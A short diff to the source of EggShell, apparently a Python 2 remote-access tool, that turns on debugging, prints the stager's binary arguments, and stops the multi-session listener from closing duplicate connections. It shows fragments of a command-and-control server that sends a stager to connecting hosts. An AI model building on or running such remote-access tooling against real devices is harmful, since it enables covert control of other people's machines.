@@ -1,7 +1,6 @@
-#!/usr/bin/python
 #EggShell
 #Created By lucas.py 8-18-16
-debug = 0
+debug = 1
 
 import base64
 import binascii
@@ -494,6 +493,7 @@ class SessionHandler:
         hostAddress = addr[0]
         if verbose:
             print strinfo("Connecting to "+hostAddress)
+            print strinfo("Args: "+INSTRUCT_BINARY_ARGUMENT)
         conn.send(INSTRUCT_STAGER)
         CDA = conn.recv(128)
 
@@ -564,12 +564,12 @@ def multiServer(host,port):
     print "type \"help\" for MultiServer commands"
     while 1:
         newsession = SessionHandler()
-        newsession.listen(0,host,port)
+        newsession.listen(debug,host,port)
         skip = 0
         for sx in sessions:
             if newsession.uid == sessions[sx].uid:
-                newsession.conn.close()
-                skip = 1
+                #newsession.conn.close()
+                #skip = 1
                 continue
         if skip:
             continue
